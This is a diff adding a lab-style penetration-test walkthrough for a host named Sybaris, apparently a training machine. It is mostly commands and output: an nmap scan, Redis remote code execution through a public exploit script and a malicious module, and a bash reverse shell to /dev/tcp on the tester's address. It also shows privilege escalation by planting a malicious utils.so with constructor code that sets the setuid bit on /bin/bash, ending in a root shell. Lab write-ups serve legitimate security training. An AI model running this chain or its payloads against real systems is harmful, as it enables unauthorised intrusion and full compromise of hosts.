@@ -1,0 +1,98 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.115.93 > Sybaris.txt 
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.2
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.45.178
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 21:94:de:d3:69:64:a8:4d:a8:f0:b5:0a:ea:bd:02:ad (RSA)
+|   256 67:42:45:19:8b:f5:f9:a5:a4:cf:fb:87:48:a2:66:d0 (ECDSA)
+|_  256 f3:e2:29:a3:41:1e:76:1e:b1:b7:46:dc:0b:b9:91:77 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
+|_http-title: Sybaris - Just another HTMLy blog
+| http-methods: 
+|_  Supported Methods: GET POST
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-generator: HTMLy v2.7.5
+| http-robots.txt: 11 disallowed entries 
+| /config/ /system/ /themes/ /vendor/ /cache/ 
+| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
+|_/admin/
+|_http-favicon: Unknown favicon MD5: A4DA8778FE902EB34FD9A5D4C0A832E1
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
+6379/tcp open  redis   Redis key-value store 5.0.9
+Service Info: OS: Unix
+
+# Confirm vulnerable redis 5.0.9 and get rce script and malicious redis module exp.so
+https://github.com/jas502n/Redis-RCE
+─$ python3 redis-rce.py -r 192.168.115.93 -L 192.168.45.178 -P 6379 -f exp_lin.so -v
+$ id
+uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
+$ /bin/bash -i >& /dev/tcp/192.168.45.178/21 0>&1
+
+$ rlwrap nc -nlvp 21  
+listening on [any] 21 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.115.93] 40284
+bash: no job control in this shell
+[pablo@sybaris tmp]$ id
+id
+uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
+
+Linux sybaris 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+ *  *  *  *  * root       /usr/bin/log-sweeper
+
+$ strings /usr/bin/log-sweeper
+/lib64/ld-linux-x86-64.so.2
+utils.so
+[pablo@sybaris redis]$ find / -name utils.so 2>/dev/null
+/usr/local/lib/utils/utils.so
+
+[pablo@sybaris lib]$ ls -la
+total 0
+drwxr-xr-x.  4 root root  30 Sep  7  2020 .
+drwxr-xr-x. 12 root root 131 Sep  4  2020 ..
+drwxrwxrwx   2 root root   6 Sep  7  2020 dev
+drwxr-xr-x.  2 root root  22 Sep  4  2020 utils
+
+# Found that we have write permission to /usr/local/lib/dev. So when log-sweeper running, it will find utils.so in order. We can write a malicious utils.so in /usr/local/lib/dev. When log-sweeper run, it will found this malicious utils.so then execute it.
+
+# Create utils.c , When a shared object (.so file) is loaded into a process, functions marked with the __attribute__((constructor)) attribute execute automatically before the main program starts.
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor)); 
+
+void inject() {
+        system("chmod +s /bin/bash");
+}
+
+# -fPIC: Generates Position-Independent Code. This is required for shared libraries because they are loaded at different memory addresses depending on the process.
+# -shared: Tells the compiler to produce a shared object (.so) instead of an executable binary.
+[pablo@sybaris dev]$ gcc -fPIC -shared utils.c -o utils.so
+
+[pablo@sybaris dev]$ ls -la /bin/bash
+-rwxr-xr-x. 1 root root 964536 Mar 31  2020 /bin/bash
+[pablo@sybaris dev]$ ls -la /bin/bash
+-rwsr-sr-x. 1 root root 964536 Mar 31  2020 /bin/bash
+[pablo@sybaris dev]$ /bin/bash -p
+bash-4.2# id    id
+uid=1000(pablo) gid=1000(pablo) euid=0(root) egid=0(root) groups=0(root),1000(pablo)
+
+
